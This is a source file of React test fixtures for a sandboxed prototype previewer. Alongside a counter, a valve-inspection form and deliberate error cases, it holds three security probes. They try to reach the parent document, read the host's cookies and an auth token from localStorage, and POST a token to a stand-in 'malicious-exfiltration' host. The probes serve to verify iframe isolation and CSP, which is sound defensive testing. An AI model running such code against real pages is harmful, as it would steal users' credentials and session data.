/**
 * Prototype Sandbox Fixture Catalog:
 * Raw source strings of test fixtures for both dev UI and automated tests.
 */

export const COUNTER_FIXTURE_CODE = `import React, { useState } from 'react';

export default function CounterFixture() {
  const [count, setCount] = useState(0);

  return (
    <div className="p-6 max-w-sm mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-xl font-bold text-gray-900" data-testid="counter-title">
        Interactive Counter
      </h2>
      <p className="text-sm text-gray-500">
        Tests React state transitions inside the sandboxed iframe.
      </p>
      <div className="flex items-center space-x-4">
        <span
          data-testid="counter-value"
          className="text-3xl font-extrabold text-blue-600 w-16 text-center"
        >
          {count}
        </span>
        <button
          data-testid="increment-btn"
          onClick={() => setCount((prev) => prev + 1)}
          className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg shadow-sm transition"
        >
          Increment
        </button>
        <button
          data-testid="reset-btn"
          onClick={() => setCount(0)}
          className="px-3 py-2 bg-gray-200 hover:bg-gray-300 text-gray-700 rounded-lg text-sm transition"
        >
          Reset
        </button>
      </div>
    </div>
  );
}
`;

export const VALVE_INSPECTION_FIXTURE_CODE = `import React, { useState } from 'react';

export default function ValveInspectionFixture() {
  const [pressure, setPressure] = useState('650');
  const [status, setStatus] = useState('DRAFT');
  const [isSubmitted, setIsSubmitted] = useState(false);

  const numPressure = parseFloat(pressure);
  const isValidNumber = !isNaN(numPressure);
  const isOutOfRange = isValidNumber && (numPressure < 450.0 || numPressure > 850.0);
  const isSafe = isValidNumber && !isOutOfRange;

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isSafe) {
      setStatus('SUBMITTED');
      setIsSubmitted(true);
    }
  };

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <div className="flex items-center justify-between border-b pb-3">
        <div>
          <h2 className="text-lg font-bold text-gray-900" data-testid="form-title">
            Valve Inspection & Pressure Check
          </h2>
          <span className="text-xs text-gray-400 font-mono">INT-004 / WS-OPS-001</span>
        </div>
        <span
          data-testid="status-badge"
          className={\`text-xs px-2.5 py-1 rounded-full font-semibold \${
            status === 'SUBMITTED'
              ? 'bg-green-100 text-green-700'
              : 'bg-gray-100 text-gray-700'
          }\`}
        >
          {status}
        </span>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label
            htmlFor="pressure-input"
            className="block text-sm font-medium text-gray-700 mb-1"
          >
            Valve Pressure (PSI)
          </label>
          <input
            id="pressure-input"
            data-testid="pressure-input"
            type="number"
            step="0.1"
            value={pressure}
            onChange={(e) => {
              setPressure(e.target.value);
              setIsSubmitted(false);
            }}
            className={\`w-full px-3 py-2 border rounded-md shadow-sm focus:outline-none focus:ring-2 \${
              isOutOfRange
                ? 'border-red-500 focus:ring-red-500 bg-red-50'
                : 'border-gray-300 focus:ring-blue-500'
            }\`}
          />
          <p className="mt-1 text-xs text-gray-500">
            Mandatory operating range: 450.0 - 850.0 PSI
          </p>
        </div>

        {isOutOfRange && (
          <div
            data-testid="validation-warning"
            className="p-3 bg-red-50 border border-red-300 rounded-md text-red-700 text-xs flex items-center gap-2"
          >
            <span className="font-bold">CRITICAL:</span>
            <span>
              Valve pressure {numPressure} PSI is outside safe operating range (450.0 - 850.0 PSI).
            </span>
          </div>
        )}

        {isSafe && (
          <div
            data-testid="validation-success"
            className="p-3 bg-green-50 border border-green-300 rounded-md text-green-700 text-xs flex items-center gap-2"
          >
            <span className="font-bold">NORMAL:</span>
            <span>Valve pressure is within safe operating parameters.</span>
          </div>
        )}

        {isSubmitted && (
          <div
            data-testid="submit-confirmation"
            className="p-3 bg-blue-50 border border-blue-300 rounded-md text-blue-700 text-xs"
          >
            Inspection report successfully submitted to field operations log.
          </div>
        )}

        <button
          type="submit"
          data-testid="submit-btn"
          disabled={!isSafe}
          onClick={handleSubmit}
          className="w-full py-2 px-4 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-medium rounded-md shadow transition"
        >
          Submit Inspection Record
        </button>
      </form>
    </div>
  );
}
`;

export const COMPILE_ERROR_FIXTURE_CODE = `import React from 'react';

// Intentional malformed JSX syntax error: unclosed tag
export default function BrokenSyntaxFixture() {
  return (
    <div className="p-4 bg-red-100">
      <span className="font-bold">Unclosed span tag
    </div>
  );
}
`;

export const RUNTIME_ERROR_FIXTURE_CODE = `import React from 'react';

// Intentional runtime render exception
export default function RuntimeErrorFixture() {
  throw new Error('Synthetic render failure inside sandboxed prototype component.');
  return <div>Will never render</div>;
}
`;

export const SECURITY_DOM_ESCAPE_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityDomEscapeFixture() {
  const [probeResult, setProbeResult] = useState('Testing...');
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    try {
      const parentDoc = window.parent.document;
      setProbeResult('SECURITY BREACH: Accessed parent document: ' + parentDoc.title);
      setIsBlocked(false);
    } catch (err) {
      setProbeResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsBlocked(true);
    }
  }, []);

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="security-title">
        Parent DOM Boundary Probe
      </h2>
      <p className="text-sm text-gray-600">
        Attempts to access <code>window.parent.document</code>.
      </p>

      <div
        data-testid="dom-probe-result"
        className={\`p-3 rounded-md border text-xs font-mono whitespace-pre-wrap \${
          isBlocked
            ? 'bg-green-50 border-green-300 text-green-800'
            : 'bg-red-50 border-red-300 text-red-800'
        }\`}
      >
        {probeResult}
      </div>

      <div className="text-xs text-gray-500">
        Status: <span data-testid="dom-isolation-status" className="font-bold">{isBlocked ? 'BLOCKED' : 'BREACHED'}</span>
      </div>
    </div>
  );
}
`;

export const SECURITY_STORAGE_THEFT_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityStorageTheftFixture() {
  const [cookieResult, setCookieResult] = useState('Testing cookie...');
  const [storageResult, setStorageResult] = useState('Testing localStorage...');
  const [isCookieBlocked, setIsCookieBlocked] = useState(false);
  const [isStorageBlocked, setIsStorageBlocked] = useState(false);

  useEffect(() => {
    // 1. Parent cookie
    try {
      const cookie = window.parent.document.cookie;
      setCookieResult('SECURITY BREACH: Read parent cookies: ' + cookie);
      setIsCookieBlocked(false);
    } catch (err) {
      setCookieResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsCookieBlocked(true);
    }

    // 2. Parent localStorage
    try {
      const parentStorage = window.parent.localStorage;
      const testItem = parentStorage.getItem('host-auth-token');
      setStorageResult('SECURITY BREACH: Read parent localStorage: ' + testItem);
      setIsStorageBlocked(false);
    } catch (err) {
      setStorageResult('ISOLATION ENFORCED: ' + (err && err.message ? err.message : String(err)));
      setIsStorageBlocked(true);
    }
  }, []);

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="storage-security-title">
        Host Storage & Cookie Theft Probe
      </h2>

      <div className="space-y-2">
        <div className="text-xs font-semibold text-gray-700">Cookie Access:</div>
        <div
          data-testid="cookie-probe-result"
          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
            isCookieBlocked
              ? 'bg-green-50 border-green-300 text-green-800'
              : 'bg-red-50 border-red-300 text-red-800'
          }\`}
        >
          {cookieResult}
        </div>
      </div>

      <div className="space-y-2">
        <div className="text-xs font-semibold text-gray-700">LocalStorage Access:</div>
        <div
          data-testid="storage-probe-result"
          className={\`p-2 rounded border text-xs font-mono whitespace-pre-wrap \${
            isStorageBlocked
              ? 'bg-green-50 border-green-300 text-green-800'
              : 'bg-red-50 border-red-300 text-red-800'
          }\`}
        >
          {storageResult}
        </div>
      </div>

      <div className="text-xs text-gray-500">
        Status: <span data-testid="storage-isolation-status" className="font-bold">
          {isCookieBlocked && isStorageBlocked ? 'ISOLATED' : 'VULNERABLE'}
        </span>
      </div>
    </div>
  );
}
`;

export const SECURITY_NETWORK_EXFILTRATION_FIXTURE_CODE = `import React, { useState, useEffect } from 'react';

export default function SecurityNetworkExfiltrationFixture() {
  const [networkResult, setNetworkResult] = useState('Initiating network fetch...');
  const [isBlocked, setIsBlocked] = useState(false);

  useEffect(() => {
    fetch('https://malicious-exfiltration.example.com/api/steal-tokens', {
      method: 'POST',
      body: JSON.stringify({ leaked: 'secret-token' }),
    })
      .then((res) => {
        setNetworkResult('SECURITY BREACH: Network request succeeded with status ' + res.status);
        setIsBlocked(false);
      })
      .catch((err) => {
        const msg = err && err.message ? err.message : String(err);
        setNetworkResult('CSP ENFORCED: Blocked outbound network connection (' + msg + ')');
        setIsBlocked(true);
      });
  }, []);

  return (
    <div className="p-6 max-w-md mx-auto bg-white rounded-xl shadow-md space-y-4 border border-gray-200">
      <h2 className="text-lg font-bold text-gray-900" data-testid="network-security-title">
        Outbound Network Access Probe
      </h2>
      <p className="text-sm text-gray-600">
        Tests CSP connect-src 'none' enforcement against outbound HTTP requests.
      </p>

      <div
        data-testid="network-probe-result"
        className={\`p-3 rounded-md border text-xs font-mono whitespace-pre-wrap \${
          isBlocked
            ? 'bg-green-50 border-green-300 text-green-800'
            : 'bg-red-50 border-red-300 text-red-800'
        }\`}
      >
        {networkResult}
      </div>

      <div className="text-xs text-gray-500">
        Network Policy: <span data-testid="network-isolation-status" className="font-bold">{isBlocked ? 'BLOCKED' : 'PERMITTED'}</span>
      </div>
    </div>
  );
}
`;
